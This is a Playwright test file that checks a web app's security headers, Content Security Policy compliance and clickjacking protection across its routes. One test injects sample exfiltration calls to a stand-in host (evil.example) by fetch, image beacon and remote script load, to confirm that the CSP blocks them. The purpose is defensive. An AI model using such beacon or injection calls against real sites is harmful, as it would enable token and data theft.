/**
 * Security audit 2026-11 M-2: every response carries the security headers, and the app works under its CSP —
 * no `securitypolicyviolation` event and no CSP console error on the main routes, signed out and signed in.
 * Supabase Auth and the BayiOS API are MOCKED at the network layer (support/mock-backend.ts); CSP is enforced by
 * the browser before page.route sees a request, so a blocked API/Supabase origin would still show up here.
 */
import { expect, test, type Page, type Response } from "@playwright/test";
import { DESKTOP } from "./viewports";
import { API_URL, SUPABASE_URL, signedIn } from "./support/mock-backend";
import { orderId } from "./support/mock-orders";
import { productId } from "./support/mock-catalog";
import { customerId } from "./support/mock-commerce";

test.use({ viewport: DESKTOP });

const PUBLIC_ROUTES = ["/", "/giris", "/kayit", "/sifre-sifirla", "/davet"];
const APP_ROUTES = [
  "/pano",
  "/siparisler",
  "/siparisler/yeni",
  `/siparisler/${orderId(1)}`,
  "/siparisler/whatsapp",
  "/urunler",
  "/urunler/yeni",
  `/urunler/${productId(1)}`,
  "/stok",
  "/stok/duzeltme",
  "/depo",
  "/depo/mal-kabul",
  "/musteriler",
  `/musteriler/${customerId(1)}`,
  "/fiyat-listeleri",
  "/raporlar",
  "/raporlar/kritik-stok",
  "/ice-aktarma",
  "/ice-aktarma/yeni",
  "/ayarlar",
  "/ayarlar/ekip",
  "/tasarim-sistemi",
];

type Violation = { directive: string; blocked: string };

/** Collects CSP violations (DOM event, survives client navigations) and CSP console errors. */
async function watchCsp(page: Page) {
  const console: string[] = [];
  page.on("console", (message) => {
    if (/Content Security Policy|Refused to (load|execute|connect|apply|frame)/i.test(message.text())) console.push(message.text());
  });
  await page.addInitScript(() => {
    const store: { directive: string; blocked: string }[] = [];
    (window as unknown as { __cspViolations: typeof store }).__cspViolations = store;
    document.addEventListener("securitypolicyviolation", (e) =>
      store.push({ directive: e.effectiveDirective, blocked: e.blockedURI }),
    );
  });
  return {
    async violations(): Promise<{ events: Violation[]; console: string[] }> {
      const events = await page.evaluate(() => (window as unknown as { __cspViolations?: Violation[] }).__cspViolations ?? []);
      return { events, console: [...console] };
    },
  };
}

function expectSecurityHeaders(response: Response | null, path: string) {
  expect(response, path).not.toBeNull();
  const headers = response!.headers();
  const csp = headers["content-security-policy"] ?? "";
  expect(csp, path).toContain("frame-ancestors 'none'");
  expect(csp, path).toContain("object-src 'none'");
  expect(csp, path).toContain("base-uri 'none'");
  expect(csp, path).toContain(`connect-src 'self' ${new URL(API_URL).origin} ${new URL(SUPABASE_URL).origin}`);
  expect(csp, path).not.toContain("unsafe-eval");
  expect(headers["x-frame-options"], path).toBe("DENY");
  expect(headers["x-content-type-options"], path).toBe("nosniff");
  expect(headers["referrer-policy"], path).toBe("no-referrer");
  expect(headers["permissions-policy"], path).toContain("camera=()");
  expect(headers["x-powered-by"], path).toBeUndefined();
}

async function settle(page: Page) {
  await expect(page.getByRole("heading", { level: 1 }).first()).toBeVisible();
  await page.waitForLoadState("networkidle");
}

test("public routes: headers present, no CSP violation", async ({ page }) => {
  const csp = await watchCsp(page);
  for (const path of PUBLIC_ROUTES) {
    const response = await page.goto(path);
    expectSecurityHeaders(response, path);
    await settle(page);
    expect(await csp.violations(), path).toEqual({ events: [], console: [] });
  }

  // Detector self-check + exfiltration channels: an injected script could not send a token to a foreign origin
  // by fetch or by image beacon, and a foreign script cannot be loaded.
  await page.evaluate(async () => {
    await fetch("https://evil.example/steal").catch(() => undefined);
    const img = new Image();
    img.src = "https://evil.example/beacon.gif";
    const script = document.createElement("script");
    script.src = "https://evil.example/x.js";
    document.head.append(script);
    await new Promise((resolve) => setTimeout(resolve, 300));
  });
  const { events } = await csp.violations();
  expect(events.map((e) => e.directive).sort()).toEqual(["connect-src", "img-src", "script-src-elem"]);
});

test("signed-in app routes: headers present, no CSP violation (full loads and client navigation)", async ({ page }) => {
  test.setTimeout(120_000);
  await signedIn(page);
  const csp = await watchCsp(page);
  for (const path of APP_ROUTES) {
    const response = await page.goto(path);
    expectSecurityHeaders(response, path);
    await settle(page);
    expect(await csp.violations(), path).toEqual({ events: [], console: [] });
  }

  // Client-side navigation (RSC fetches, prefetches) under the same policy.
  await page.goto("/pano");
  const nav = page.getByRole("navigation", { name: "Ana menü" });
  for (const label of ["Siparişler", "Ürünler", "Stok", "Depo", "Müşteriler", "Raporlar", "Ayarlar"]) {
    await nav.getByRole("link", { name: label, exact: true }).click();
    await expect(page.getByRole("heading", { level: 1, name: label })).toBeVisible();
  }
  await page.waitForLoadState("networkidle");
  expect(await csp.violations()).toEqual({ events: [], console: [] });
});

test("redirects, static assets and 404s carry the headers too", async ({ page, request }) => {
  // Proxy redirect (no session).
  const redirect = await request.get("/pano", { maxRedirects: 0 });
  expect(redirect.status()).toBe(307);
  expect(redirect.headers()["x-frame-options"]).toBe("DENY");
  expect(redirect.headers()["content-security-policy"]).toContain("frame-ancestors 'none'");
  expect(redirect.headers()["x-powered-by"]).toBeUndefined();

  // A 404 outside the proxy matcher (static asset path).
  const notFound = await request.get("/_next/static/yok-boyle-bir-dosya.js");
  expect(notFound.status()).toBe(404);
  expect(notFound.headers()["content-security-policy"]).toContain("frame-ancestors 'none'");

  await page.goto("/giris");
  const script = await page.evaluate(() => document.querySelector<HTMLScriptElement>("script[src^='/_next/static/']")?.src);
  expect(script).toBeTruthy();
  const asset = await request.get(script!);
  expect(asset.status()).toBe(200);
  expect(asset.headers()["x-content-type-options"]).toBe("nosniff");
});

test("the app cannot be framed by another origin (clickjacking)", async ({ page, baseURL }) => {
  // A foreign page that embeds the app's sign-in screen. 127.0.0.1 is another origin than localhost (and, unlike a
  // public host, is not stopped by Chrome's private-network rules before the app's headers are even read).
  const framer = new URL(baseURL!);
  framer.hostname = "127.0.0.1";
  framer.pathname = "/__framer-test__";
  const control = new URL("/__frame-control__", framer).href;
  await page.route(framer.href, (route) =>
    route.fulfill({
      contentType: "text/html",
      body: `<iframe name="control" src="${control}"></iframe><iframe name="app" src="${baseURL}/giris"></iframe>`,
    }),
  );
  await page.route(control, (route) => route.fulfill({ contentType: "text/html", body: "<input aria-label='control'>" }));
  await page.goto(framer.href, { waitUntil: "load" });
  // Blocked by frame-ancestors / X-Frame-Options: Chrome replaces the frame with its error page, so the sign-in
  // form (and any one-click action of the app) is never rendered under a foreign page.
  // Control: a frame without those headers does render in this setup, so the assertion below is not vacuous.
  await expect(page.frame({ name: "control" })!.getByLabel("control")).toBeVisible();
  const frame = page.frame({ name: "app" });
  expect(frame).not.toBeNull();
  await expect.poll(() => frame!.url()).not.toBe(`${baseURL}/giris`);
  expect(await frame!.locator("input").count().catch(() => 0)).toBe(0);
});
